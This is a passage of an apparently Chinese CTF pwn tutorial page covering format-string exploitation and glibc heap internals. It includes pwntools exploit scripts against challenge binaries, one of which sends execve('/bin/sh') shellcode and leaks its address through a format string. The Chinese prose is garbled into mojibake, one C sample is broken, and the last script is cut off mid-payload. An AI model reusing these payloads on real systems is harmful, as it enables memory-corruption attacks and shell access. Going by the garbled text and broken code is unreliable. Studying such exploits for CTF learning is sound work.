class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>io=process(<span class="hljs-string">&#x27;./fmtstr1&#x27;</span>)<br><br>x_addr=<span class="hljs-number">0x0804A02C</span><br><br>payload=p32(x_addr)+<span class="hljs-string">b&quot;%11$n&quot;</span><br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./goodluck&#x27;</span>)<br><br>payload = <span class="hljs-string">&quot;%9$s&quot;</span><br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="0x05-å †åˆ©ç”¨heap"><a href="#0x05-å †åˆ©ç”¨heap" class="headerlink" title="0x05 å †åˆ©ç”¨heap"></a>0x05 å †åˆ©ç”¨heap</h2><h3 id="ä¸€ã€å †ç®¡ç†å™¨"><a href="#ä¸€ã€å †ç®¡ç†å™¨" class="headerlink" title="ä¸€ã€å †ç®¡ç†å™¨"></a>ä¸€ã€å †ç®¡ç†å™¨</h3><h4 id="1ã€å †æ¦‚è¿°"><a href="#1ã€å †æ¦‚è¿°" class="headerlink" title="1ã€å †æ¦‚è¿°"></a>1ã€å †æ¦‚è¿°</h4><p><strong>ä»€ä¹ˆæ˜¯å †ï¼Ÿ</strong></p><ul><li>æ˜¯è™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€å—è¿ç»­çš„çº¿æ€§åŒºåŸŸ</li><li>æä¾›åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œå…è®¸ç¨‹åºç”³è¯·å¤§å°æœªçŸ¥çš„å†…å­˜</li><li>åœ¨ç”¨æˆ·ä¸æ“ä½œç³»ç»Ÿä¹‹é—´ï¼Œä½œä¸ºåŠ¨æ€å†…å­˜ç®¡ç†çš„ä¸­é—´äºº</li><li>å“åº”ç”¨æˆ·çš„ç”³è¯·å†…å­˜è¯·æ±‚ï¼Œ å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ï¼Œç„¶åå°†å…¶è¿”å›ç»™ç”¨æˆ·ç¨‹åº</li><li>ç®¡ç†ç”¨æˆ·æ‰€é‡Šæ”¾çš„å†…å­˜ï¼Œé€‚æ—¶å½’è¿˜ç»™æ“ä½œç³»ç»Ÿ</li></ul><p><strong>å„ç§å †ç®¡ç†å™¨</strong></p><blockquote><p>å †ç®¡ç†å™¨å¹¶éç”±æ“ä½œç³»ç»Ÿå®ç°ï¼Œè€Œæ˜¯ç”±libc.so.6é“¾æ¥åº“å®ç°ã€‚ å°è£…äº†ä¸€äº›ç³»ç»Ÿè°ƒç”¨ï¼Œä¸ºç”¨æˆ·æä¾›æ–¹ä¾¿çš„åŠ¨æ€å†…å­˜åˆ†é…æ¥å£çš„åŒæ—¶ï¼ŒåŠ›æ±‚é«˜æ•ˆåœ°ç®¡ç†ç”±ç³»ç»Ÿè°ƒç”¨ç”³è¯·æ¥çš„å†…å­˜ã€‚</p></blockquote><ul><li><p>dlmalloc â€“ General purpose allocator</p></li><li><p>ptmalloc2 â€“ glibc ï¼ˆæ•²é»‘æ¿ï¼‰</p></li><li><p>jemalloc â€“ FreeBSD and Firefox</p></li><li><p>tcmalloc â€“ Google</p></li><li>libumem â€“ Solaris</li></ul><p><strong>ç”³è¯·å†…å­˜çš„ç³»ç»Ÿè°ƒç”¨</strong></p><ul><li>brk<ul><li>ä¸»çº¿ç¨‹ç”³è¯·ç©ºé—´è¾ƒå°æ—¶</li><li>åœ¨ Data æ®µä¸Šæ–¹ç”³è¯·ç©ºé—´</li></ul></li><li>mmap<ul><li>ä¸»çº¿ç¨‹ç”³è¯·ç©ºé—´è¾ƒå¤§æ—¶ã€å­çº¿ç¨‹ç”³è¯·æ—¶</li><li>åœ¨ Memory map æ®µç”³è¯·ç©ºé—´</li></ul></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/e527cd2b75b5b89d8bb3455fba45c300.png" alt="image-20220419223255874" style="zoom:67%;"></p><h4 id="2ã€Areana"><a href="#2ã€Areana" class="headerlink" title="2ã€Areana"></a>2ã€Areana</h4><p><strong>arena</strong></p><ul><li><p>å†…å­˜åˆ†é…åŒºï¼Œå¯ä»¥ç†è§£ä¸ºå †ç®¡ç†å™¨æ‰€æŒæœ‰çš„å†…å­˜æ± </p></li><li><p>æ“ä½œç³»ç»Ÿ â€”&gt; å †ç®¡ç†å™¨ â€”&gt; ç”¨æˆ·<br>ç‰©ç†å†…å­˜ â€”&gt; arena â€”&gt; å¯ç”¨å†…å­˜</p></li><li><p>å †ç®¡ç†å™¨ä¸ç”¨æˆ·çš„å†…å­˜äº¤æ˜“å‘ç”Ÿäºarenaä¸­ï¼Œå¯ä»¥ç†è§£ä¸ºå †ç®¡ç†å™¨å‘æ“ä½œç³»ç»Ÿæ‰¹å‘æ¥çš„æœ‰å†—ä½™çš„å†…å­˜åº“å­˜</p></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/ea35937bebf785c1595dd9aac3901830.png" alt="image-20220419230423543" style="zoom:80%;"></p><h4 id="3ã€Chunk"><a href="#3ã€Chunk" class="headerlink" title="3ã€Chunk"></a>3ã€Chunk</h4><p><strong>chunk</strong></p><ul><li><p>ç”¨æˆ·ç”³è¯·å†…å­˜çš„å•ä½ï¼Œä¹Ÿæ˜¯å †ç®¡ç†å™¨ç®¡ç†å†…å­˜çš„åŸºæœ¬å•ä½</p></li><li><p><code>malloc()</code> è¿”å›çš„æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ª chunk çš„æ•°æ®åŒºåŸŸ</p></li></ul><p><strong>chunk åœ¨ glic ä¸­çš„å®ç°</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span>Â <span class="hljs-title">malloc_chunk</span>Â &#123;</span><br>    INTERNAL_SIZE_TÂ Â Â Â Â Â prev_size;Â Â <span class="hljs-comment">/*Â SizeÂ ofÂ previousÂ chunkÂ (ifÂ free).Â Â */</span><br>    INTERNAL_SIZE_TÂ Â Â Â Â Â size;Â Â Â Â Â Â Â <span class="hljs-comment">/*Â SizeÂ inÂ bytes,Â includingÂ overhead.Â */</span><br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span>Â <span class="hljs-title">malloc_chunk</span>*Â <span class="hljs-title">fd</span>;</span>Â Â Â Â Â Â Â Â Â <span class="hljs-comment">/*Â doubleÂ linksÂ --Â usedÂ onlyÂ ifÂ free.Â */</span><br>Â Â   <span class="hljs-class"><span class="hljs-keyword">struct</span>Â <span class="hljs-title">malloc_chunk</span>*Â <span class="hljs-title">bk</span>;</span><br><br>    <span class="hljs-comment">/*Â OnlyÂ usedÂ forÂ largeÂ blocks:Â pointerÂ toÂ nextÂ largerÂ size.Â Â */</span><br>Â Â   <span class="hljs-class"><span class="hljs-keyword">struct</span>Â <span class="hljs-title">malloc_chunk</span>*Â <span class="hljs-title">fd_nextsize</span>;</span>Â <span class="hljs-comment">/*Â doubleÂ linksÂ --Â usedÂ onlyÂ ifÂ free.Â */</span><br>Â   Â <span class="hljs-class"><span class="hljs-keyword">struct</span>Â <span class="hljs-title">malloc_chunk</span>*Â <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>Chunk çš„å¾®è§‚ç»“æ„</strong></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/f413c33c3ae06f075ec468bd03944c3b.png" alt="image-20220419225208374" style="zoom:80%;"></p><ul><li><p><strong>prev_size</strong></p><p>è‹¥å‰ä¸€ä¸ªç‰©ç†ç›¸é‚»çš„chunkæ˜¯free chunkï¼Œåˆ™è¡¨ç¤ºå…¶å¤§å°ã€‚å¦åˆ™ç”¨äºå­˜å‚¨å‰ä¸€ä¸ªchunkçš„æ•°æ®</p></li><li><p><strong>size</strong><br>å æ®ä¸€å­—é•¿çš„ä½3bitsä»¥åçš„åœ°å€ï¼Œç”¨äºè¡¨ç¤ºå½“å‰chunkçš„å¤§å°ï¼ˆæ•´ä¸ªchunkçš„å¤§å°ï¼ŒåŒ…æ‹¬chunkå¤´ï¼‰</p><ul><li><p><strong>A flag</strong></p><p>NON_MAIN_ARENAï¼Œè®°å½•å½“å‰ chunkæ˜¯å¦ä¸å±äºä¸»çº¿ç¨‹ï¼Œ1 è¡¨ç¤ºä¸å±äºï¼Œ0 è¡¨ç¤ºå±äºã€‚</p></li><li><p><strong>M flag</strong></p><p>IS_MAPPEDï¼Œè®°å½•å½“å‰ chunk æ˜¯å¦æ˜¯ç”± mmap åˆ†é…çš„ã€‚</p></li><li><p><strong>P flag</strong></p><p>PREV_INUSEï¼Œè®°å½•å‰ä¸€ä¸ª chunk å—æ˜¯å¦è¢«åˆ†é…ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå †ä¸­ç¬¬ä¸€ä¸ªè¢«åˆ†é…çš„å†…å­˜å—çš„ size å­—æ®µçš„ P ä½éƒ½ä¼šè¢«è®¾ç½®ä¸º 1ï¼Œä»¥ä¾¿äºé˜²æ­¢è®¿é—®å‰é¢çš„éæ³•å†…å­˜ã€‚å½“ä¸€ä¸ª chunk çš„ size çš„ P ä½ä¸º 0 æ—¶ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡ prev_size å­—æ®µæ¥è·å–ä¸Šä¸€ä¸ª chunk çš„å¤§å°ä»¥åŠåœ°å€ã€‚è¿™ä¹Ÿæ–¹ä¾¿è¿›è¡Œç©ºé—² chunk ä¹‹é—´çš„åˆå¹¶ã€‚</p></li></ul></li><li><p><strong>fd</strong> <strong>pointer</strong></p><p>åœ¨binä¸­æŒ‡å‘ä¸‹ä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk</p></li><li><p><strong>bk pointer</strong></p><p>åœ¨binä¸­æŒ‡å‘ä¸Šä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk</p></li><li><p><strong>fd_nextsize</strong></p><p>åœ¨large binä¸­æŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆ</p></li><li><p><strong>bk_nextsize</strong></p><p>åœ¨large binä¸­æŒ‡å‘åä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆ</p></li></ul><p><strong>chunk çš„åˆ†ç±»</strong></p><ul><li>æŒ‰çŠ¶æ€<ul><li>mallocedã€free</li></ul></li><li>æŒ‰å¤§å°<ul><li>fastã€smallã€largeã€Tcache</li></ul></li><li>æŒ‰ç‰¹å®šåŠŸèƒ½<ul><li>top chunkã€last remainder chunk</li></ul></li></ul><p><strong>malloced chunk</strong></p><p>å·²è¢«åˆ†é…ä¸”å¡«å†™äº†ç›¸åº”æ•°æ®çš„chunk</p><p><strong>free chunk</strong></p><p>è¢«é‡Šæ”¾æ‰çš„malloced chunkæˆä¸ºfree chunk</p><p><img src="/2022/01/19/CTF/Pwn/Pwn/007246579d4638f458a96dfe45e69878.png" alt="image-20220423170006917" style="zoom:80%;"></p><p><strong>top chunk</strong></p><p>arenaä¸­ä»æœªè¢«ä½¿ç”¨è¿‡çš„å†…å­˜åŒºåŸŸ</p><p><strong>last remainder chunk</strong></p><p>mallocåˆ†å‰²åŸchunkåå‰©ä½™çš„éƒ¨åˆ†</p><p><img src="/2022/01/19/CTF/Pwn/Pwn/60c09d89839cba6692edf6ed05dda6fa.png" alt="image-20220423170123790" style="zoom: 80%;"></p><h4 id="4ã€Bin"><a href="#4ã€Bin" class="headerlink" title="4ã€Bin"></a>4ã€Bin</h4><p><strong>bin</strong></p><p>ç®¡ç† arena ä¸­ç©ºé—² chunk çš„ç»“æ„ï¼Œä»¥æ•°ç»„çš„å½¢å¼å­˜åœ¨ï¼Œæ•°ç»„å…ƒç´ ä¸ºç›¸åº”å¤§å°çš„ chunk é“¾è¡¨çš„é“¾è¡¨å¤´ï¼Œå­˜åœ¨äº arena çš„ malloc_state ä¸­</p><ul><li>unsorted bin </li><li>fast bins </li><li>small bins </li><li>large bins </li><li>(tcache)</li></ul><p><strong>main arena çš„ malloc_state å¹¶ä¸æ˜¯ heap segment çš„ä¸€éƒ¨åˆ†ï¼Œè€Œæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå­˜å‚¨åœ¨ libc.so çš„æ•°æ®æ®µ</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span>Â <span class="hljs-title">malloc_state</span>Â &#123;</span><br>Â Â Â Â <span class="hljs-comment">/*Â SerializeÂ access.Â Â */</span><br>Â Â Â Â __libc_lock_define(,Â mutex);  Â Â Â <span class="hljs-comment">/*Â FlagsÂ (formerlyÂ inÂ max_fast).Â Â */</span><br>Â Â Â Â <span class="hljs-keyword">int</span>Â flags; Â Â Â Â <span class="hljs-comment">/*Â FastbinsÂ */</span><br>Â Â Â Â mfastbinptrÂ fastbinsY[Â NFASTBINSÂ ]; Â Â Â Â <span class="hljs-comment">/*Â BaseÂ ofÂ theÂ topmostÂ chunkÂ --Â notÂ otherwiseÂ keptÂ inÂ aÂ binÂ */</span><br>Â Â Â Â mchunkptrÂ top; Â Â Â Â <span class="hljs-comment">/*Â TheÂ remainderÂ fromÂ theÂ mostÂ recentÂ splitÂ ofÂ aÂ smallÂ requestÂ */</span><br>Â Â Â Â mchunkptrÂ last_remainder; Â Â Â Â <span class="hljs-comment">/*Â NormalÂ binsÂ packedÂ asÂ describedÂ aboveÂ */</span><br>Â Â Â Â mchunkptrÂ bins[Â NBINSÂ *Â <span class="hljs-number">2</span>Â -Â <span class="hljs-number">2</span>Â ]; Â Â Â Â <span class="hljs-comment">/*Â BitmapÂ ofÂ bins,Â helpÂ toÂ speedÂ upÂ theÂ processÂ ofÂ determinatingÂ ifÂ aÂ givenÂ binÂ isÂ definitelyÂ empty.*/</span><br>Â Â Â Â <span class="hljs-keyword">unsigned</span>Â <span class="hljs-keyword">int</span>Â binmap[Â BINMAPSIZEÂ ]; Â Â Â Â <span class="hljs-comment">/*Â LinkedÂ list,Â pointsÂ toÂ theÂ nextÂ arenaÂ */</span><br>Â Â Â Â <span class="hljs-class"><span class="hljs-keyword">struct</span>Â <span class="hljs-title">malloc_state</span>Â *<span class="hljs-title">next</span>;</span> Â Â Â Â <span class="hljs-comment">/*Â LinkedÂ listÂ forÂ freeÂ arenas.Â Â AccessÂ toÂ thisÂ fieldÂ isÂ serialized</span><br><span class="hljs-comment">Â Â Â Â Â Â Â byÂ free_list_lockÂ inÂ arena.c.Â Â */</span><br>Â Â Â Â <span class="hljs-class"><span class="hljs-keyword">struct</span>Â <span class="hljs-title">malloc_state</span>Â *<span class="hljs-title">next_free</span>;</span> Â Â Â Â <span class="hljs-comment">/*Â NumberÂ ofÂ threadsÂ attachedÂ toÂ thisÂ arena.Â Â 0Â ifÂ theÂ arenaÂ isÂ on</span><br><span class="hljs-comment">Â Â Â Â Â Â Â theÂ freeÂ list.Â Â AccessÂ toÂ thisÂ fieldÂ isÂ serializedÂ by</span><br><span class="hljs-comment">Â Â Â Â Â Â Â free_list_lockÂ inÂ arena.c.Â Â */</span><br>Â Â Â Â INTERNAL_SIZE_TÂ attached_threads; Â Â Â Â <span class="hljs-comment">/*Â MemoryÂ allocatedÂ fromÂ theÂ systemÂ inÂ thisÂ arena.Â Â */</span><br>Â Â Â Â INTERNAL_SIZE_TÂ system_mem;<br>Â Â Â Â INTERNAL_SIZE_TÂ max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>fast bins</strong></p><ul><li>fastbinsY[] </li><li>å•å‘åˆ—è¡¨ </li><li>LIFO </li><li>ç®¡ç† 16ã€24ã€32ã€40ã€48ã€56ã€64 Bytes çš„ free chunksï¼ˆ32ä½ä¸‹é»˜è®¤ï¼‰ </li><li>å…¶ä¸­çš„ chunk çš„ in_use ä½ï¼ˆä¸‹ä¸€ä¸ªç‰©ç†ç›¸é‚»çš„ chunk çš„ P ä½ï¼‰æ€»ä¸º1</li></ul><p><strong>unsorted bin</strong></p><ul><li>bins[1] </li><li>ç®¡ç†åˆšåˆšé‡Šæ”¾è¿˜ä¸ºåˆ†ç±»çš„ chunk </li><li>å¯ä»¥è§†ä¸ºç©ºé—² chunk å›å½’å…¶æ‰€å± bin ä¹‹å‰çš„ç¼“å†²åŒº</li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/54e4b933e1086824764223268ace0abe.png" alt="image-20220423175224911" style="zoom: 80%;"></p><p><strong>small bins</strong></p><ul><li>bins[2] ~ bins[63] </li><li>62 ä¸ªå¾ªç¯åŒå‘é“¾è¡¨ </li><li>FIFO </li><li>ç®¡ç† 16ã€24ã€32ã€40ã€ â€¦â€¦ ã€504 Bytes çš„ free chunksï¼ˆ32ä½ä¸‹ï¼‰ </li><li>æ¯ä¸ªé“¾è¡¨ä¸­å­˜å‚¨çš„ chunk å¤§å°éƒ½ä¸€è‡´</li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/b4fd5537b92cc815878bcb2574ab0010.png" alt="image-20220423175256873"></p><p><strong>large</strong> <strong>bins</strong></p><ul><li>bins[64] ~ bins[126] </li><li>63 ä¸ªå¾ªç¯åŒå‘é“¾è¡¨</li><li>FIFO </li><li>ç®¡ç†å¤§äº 504 Bytes çš„ free chunksï¼ˆ32ä½ä¸‹ï¼‰</li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/3e6f2356d12da082555942f13df1ba50.png" alt="image-20220423175314579"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/08bd5ce100e57ccec6befeca4509d96d.png" alt="7a9ddc1e5bc248168cb6781adab19d8f" style="zoom: 80%;"></p><h3 id="äºŒã€å †åˆ†é…ç­–ç•¥"><a href="#äºŒã€å †åˆ†é…ç­–ç•¥" class="headerlink" title="äºŒã€å †åˆ†é…ç­–ç•¥"></a>äºŒã€å †åˆ†é…ç­–ç•¥</h3><h4 id="1ã€Malloc"><a href="#1ã€Malloc" class="headerlink" title="1ã€Malloc"></a>1ã€Malloc</h4><ul><li>å®ƒæ ¹æ®ç”¨æˆ·ç”³è¯·çš„å†…å­˜å—å¤§å°ä»¥åŠç›¸åº”å¤§å° chunk é€šå¸¸ä½¿ç”¨çš„é¢‘åº¦ï¼ˆfastbin chunk, small chunk, large chunkï¼‰ï¼Œä¾æ¬¡å®ç°äº†ä¸åŒçš„åˆ†é…æ–¹æ³•ã€‚</li><li>å®ƒç”±å°åˆ°å¤§ä¾æ¬¡æ£€æŸ¥ä¸åŒçš„ bin ä¸­æ˜¯å¦æœ‰ç›¸åº”çš„ç©ºé—²å—å¯ä»¥æ»¡è¶³ç”¨æˆ·è¯·æ±‚çš„å†…å­˜ã€‚</li><li>å½“æ‰€æœ‰çš„ç©ºé—² chunk éƒ½æ— æ³•æ»¡è¶³æ—¶ï¼Œå®ƒä¼šè€ƒè™‘ top chunkã€‚</li><li>å½“ top chunk ä¹Ÿæ— æ³•æ»¡è¶³æ—¶ï¼Œå †åˆ†é…å™¨æ‰ä¼šè¿›è¡Œå†…å­˜å—ç”³è¯·ã€‚</li></ul><h4 id="2ã€free"><a href="#2ã€free" class="headerlink" title="2ã€free"></a>2ã€free</h4><ul><li>å®ƒå°†ç”¨æˆ·æš‚ä¸”ä¸ç”¨çš„ chunk å›æ”¶ç»™å †ç®¡ç†å™¨ï¼Œé€‚å½“çš„æ—¶å€™è¿˜ä¼šå½’è¿˜ç»™æ“ä½œç³»ç»Ÿã€‚</li><li>å®ƒä¾æ® chunk å¤§å°æ¥ä¼˜å…ˆè¯•å›¾å°† free chunk é“¾å…¥ tcache æˆ–è€…æ˜¯ fast bin ã€‚ä¸æ»¡è¶³åˆ™é“¾å…¥ usorted bin ä¸­ã€‚</li><li>åœ¨æ¡ä»¶æ»¡è¶³æ—¶ free å‡½æ•°éå† usorted bin å¹¶å°†å…¶ä¸­çš„ç‰©ç†ç›¸é‚»çš„ free chunk åˆå¹¶ï¼Œå°†ç›¸åº”å¤§å°çš„ chunk åˆ†ç±»æ”¾å…¥ small bin æˆ– large bin ä¸­ã€‚</li><li>é™¤äº† tcache chunk ä¸ fast bin chunkï¼Œå…¶å®ƒ chunk åœ¨ free æ—¶ä¼šä¸å…¶ç‰©ç†ç›¸é‚»çš„ free chunk åˆå¹¶</li></ul><h3 id="ä¸‰ã€å †æ¼æ´ä¸å…¶åˆ©ç”¨"><a href="#ä¸‰ã€å †æ¼æ´ä¸å…¶åˆ©ç”¨" class="headerlink" title="ä¸‰ã€å †æ¼æ´ä¸å…¶åˆ©ç”¨"></a>ä¸‰ã€å †æ¼æ´ä¸å…¶åˆ©ç”¨</h3><h4 id="1ã€use-after-freeï¼ˆé‡Šæ”¾é‡ç”¨æ”»å‡»ï¼‰"><a href="#1ã€use-after-freeï¼ˆé‡Šæ”¾é‡ç”¨æ”»å‡»ï¼‰" class="headerlink" title="1ã€use after freeï¼ˆé‡Šæ”¾é‡ç”¨æ”»å‡»ï¼‰"></a>1ã€use after freeï¼ˆé‡Šæ”¾é‡ç”¨æ”»å‡»ï¼‰</h4><p><img src="/2022/01/19/CTF/Pwn/Pwn/af5d7231bce0364ac6cb4d7d407db035.png" alt="image-20220427144438898" style="zoom:67%;"></p><h4 id="2ã€double-free"><a href="#2ã€double-free" class="headerlink" title="2ã€double free"></a>2ã€double free</h4><p><img src="/2022/01/19/CTF/Pwn/Pwn/675908db3c8603e919bcba830a444931.png" alt="image-20220427144522013" style="zoom:67%;"></p><h4 id="3ã€fastbin-attack"><a href="#3ã€fastbin-attack" class="headerlink" title="3ã€fastbin attack"></a>3ã€fastbin attack</h4><p><img src="/2022/01/19/CTF/Pwn/Pwn/082108bfc6e91b9a3a0c37f05e17699e.png" alt="image-20220427144554285" style="zoom:67%;"></p><h4 id="4ã€unsortedbin-attack"><a href="#4ã€unsortedbin-attack" class="headerlink" title="4ã€unsortedbin attack"></a>4ã€unsortedbin attack</h4><ul><li><p>è¢«åˆ©ç”¨çš„å‰æï¼šæ§åˆ¶ Unsorted Bin Chunk çš„ bk æŒ‡é’ˆã€‚</p></li><li><p>å¯ä»¥è¾¾åˆ°çš„æ•ˆæœï¼šå®ç°ä¿®æ”¹ä»»æ„åœ°å€å€¼ä¸ºä¸€ä¸ªè¾ƒå¤§çš„æ•°å€¼ã€‚</p></li><li><p>å¯èƒ½çš„ç”¨é€”ï¼šé€šå¸¸æ˜¯ä¸ºäº†é…åˆ fastbin attack è€Œä½¿ç”¨çš„ã€‚</p></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/46e4f9d4bcefa81f6485b5d363106bcb.png" alt="image-20220427144641452" style="zoom:67%;"></p><h4 id="5ã€house-of-ï¼ˆå †æº¢å‡ºã€æ•´æ•°æº¢å‡ºï¼‰"><a href="#5ã€house-of-ï¼ˆå †æº¢å‡ºã€æ•´æ•°æº¢å‡ºï¼‰" class="headerlink" title="5ã€house of    ï¼ˆå †æº¢å‡ºã€æ•´æ•°æº¢å‡ºï¼‰"></a>5ã€house of    ï¼ˆå †æº¢å‡ºã€æ•´æ•°æº¢å‡ºï¼‰</h4><p><img src="/2022/01/19/CTF/Pwn/Pwn/7ab0f45f7dfc8fd55b2d126479688366.png" alt="image-20220427144725001" style="zoom:67%;"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fun</span><span class="hljs-params">(var)</span>  <span class="hljs-comment">//0x4002c7</span></span><br><span class="hljs-function"></span>&#123;<br>    print(<span class="hljs-string">&quot;%d\n&quot;</span>,var);<br>    return0;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    (<span class="hljs-number">0x4002c7</span>)(var);  <span class="hljs-comment">// = fun(var);</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb a.out</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> vmmap</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> fastbin</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> heap</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> p ptr</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> b *<span class="hljs-variable">$rebase</span>(0x18540)   <span class="hljs-comment"># åç§»åœ°å€</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> vim exp.py</span><br><span class="hljs-meta">#</span><span class="bash"> æ·»åŠ pause</span><br><span class="hljs-meta">$</span><span class="bash"> python3 exp.py</span><br><span class="hljs-meta">$</span><span class="bash"> gdb</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> attach pid</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> <span class="hljs-built_in">return</span></span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&quot;./echo2&quot;</span>)<br>elf=ELF(<span class="hljs-string">&quot;./echo2&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;hey, what&#x27;s your name? : &quot;</span>)<br>shellcode=<span class="hljs-string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br>p.sendline(shellcode)<br>p.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br><br>payload=<span class="hljs-string">b&quot;%10$p&quot;</span>+<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">3</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)<br>shellcode_addr=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;AAA&#x27;</span>,drop=<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x20</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;to exit? (y/n)&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;n&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;hello \n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;A&quot;</span>*<span 